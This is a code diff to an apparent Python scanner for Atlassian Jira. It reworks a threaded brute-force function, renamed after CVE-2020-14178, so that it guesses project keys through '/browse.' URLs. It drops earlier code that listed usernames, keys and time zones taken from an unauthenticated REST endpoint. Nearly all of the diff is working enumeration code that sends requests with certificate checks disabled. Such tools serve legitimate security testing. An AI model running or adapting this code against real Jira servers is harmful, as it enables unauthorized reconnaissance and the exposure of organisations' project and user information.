@@ -5,10 +5,9 @@ import string
 import itertools
 import threading
 
-def check_unauthenticated_projectkey_enumeration(url, path, start_id=2, end_id=3, num_threads=5):
+def cve_2020_14178_brute(url, path, start_id=2, end_id=2, num_threads=5):
     """
-    Brute force the projectKeys parameter at /rest/api/2/user/assignable/multiProjectSearch?projectKeys={project_key}
-    to check for unauthenticated project key enumeration.
+    Brute force the projectKeys parameter to check for unauthenticated project key enumeration.
     Uses threading to improve performance.
     """
     vulnerabilities = []
@@ -17,35 +16,21 @@ def check_unauthenticated_projectkey_enumeration(url, path, start_id=2, end_id=3
         'X-Atlassian-Token': 'no-check'
     }
 
-
     def worker(project_key_combinations):
         """
         Worker function for each thread to check a list of project key combinations.
         """
         for project_key in project_key_combinations:
-            url_to_test = f"{url.rstrip('/')}{path.rstrip('/')}/rest/api/2/user/assignable/multiProjectSearch?projectKeys={project_key}"
+            url_to_test = f"{url.rstrip('/')}{path.rstrip('/')}/browse.{project_key}"
             print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {url_to_test}")
             try:
                 response = requests.get(url_to_test, headers=headers, allow_redirects=False, verify=False)
                 if response.status_code == 200:
-                    data = response.json()
-                    if data:
-                        vulnerabilities.append(f"+ [Info Disclosure - ProjectKey Enumeration] Found ProjectKey: {project_key} | URL: {url_to_test}")
-                        print(f"\n{Fore.GREEN}+ Found ProjectKey: {project_key} | URL: {url_to_test}{Style.RESET_ALL}")
-                        print("\n  Enumerated Users:")
-                        for user in data:
-                            name = user.get("name", "Unknown Name")
-                            key = user.get("key", "Unknown Key")
-                            display_name = user.get("displayName", "Unknown Display Name")
-                            time_zone = user.get("timeZone", "Unknown Time Zone")
-                            active = user.get("active", False)
-                            print(f"    - Username: {name}")
-                            print(f"      Display Name: {display_name}")
-                            print(f"      Key: {key}")
-                            print(f"      Time Zone: {time_zone}")
-                            print(f"      Active: {active}")
-                    else:
-                        print(f"{Fore.YELLOW}- No users found for ProjectKey: {project_key}{Style.RESET_ALL}")
+                    vulnerabilities.append(f"+ [Info Disclosure - ProjectKey Enumeration] Found ProjectKey: {project_key} | URL: {url_to_test}")
+                    print(f"\n{Fore.GREEN}+ Found ProjectKey: {project_key} | URL: {url_to_test}{Style.RESET_ALL}")
+                elif response.status_code == 404:
+                    #print(f"{Fore.YELLOW}- No access for ProjectKey: {project_key}{Style.RESET_ALL}")
+                    pass
                 elif response.status_code == 403:
                     print(f"{Fore.YELLOW}- No access for ProjectKey: {project_key}{Style.RESET_ALL}")
                 elif response.status_code == 302:
